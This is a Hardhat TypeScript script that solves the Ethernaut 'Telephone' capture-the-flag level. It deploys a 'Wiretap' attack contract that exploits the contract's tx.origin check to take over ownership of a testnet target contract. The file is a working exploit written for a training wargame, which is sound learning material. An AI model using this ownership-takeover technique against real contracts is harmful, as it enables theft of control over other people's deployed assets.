import { ethers } from "hardhat";

const attackTelephone = async () => {
    // change contract addresses here.
    const telephoneAddress = "0xF3AEFf7A6007cCB92593880594eBd587CD8379Dd"; //type "await contract.address()" in ethernaut console
    // const player = ""; //place your player address here (you may type player in ethernaut console)
    const args: [] = [];
    const player = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from being able to change woner of contract by using
    // another contract to satisfy its condition of not being the tx.origin
    // Additional read to understand more of tx.origin and msg.sender:
    // https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin
    // https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin

    // deploying attack contract here
    // const deployed = await deployContract(hre, "EternalKing", args);
    // alternative below
    console.log("Deploying attack contract Wiretap...");
    const attack = await (await ethers.getContractFactory("Wiretap", player)).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (eternalKing.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // using my custom rpc stored in .env (for privacy)
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const players = new ethers.Wallet(player, provider);
    console.log("Player's address is: ", players.address);

    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            constant: undefined,
            inputs: [],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "constructor",
        },
        {
            constant: undefined,
            inputs: [{ internalType: "address", name: "_owner", type: "address" }],
            name: "changeOwner",
            outputs: [],
            payable: undefined,
            signature: "0xa6f9dae1",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            payable: undefined,
            signature: "0x8da5cb5b",
            stateMutability: "view",
            type: "function",
        },
    ];

    const contract = await ethers.getContractAt(ABI, telephoneAddress);
    console.log("Checking current Telephone owner...");
    const owner = await contract.owner();
    console.log(`Owner is: ${owner}`);
    console.log("Changing owner by using another contract...");
    const tx1 = await attack.changeOwner(telephoneAddress);
    const tx1Receipt = await tx1.wait();
    console.log(tx1Receipt);
    console.log("Checking Telephone owner again...");
    const newOwner = await contract.owner();
    console.log(`Owner is: ${newOwner}`);
    if (players.address === newOwner) {
        console.log("Congrats, Level passed! player is now the new owner...");
        console.log("You may now submit in ethernaut...");
    } else {
        console.log("player is still not the owner, review code above...");
    }
};

attackTelephone()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
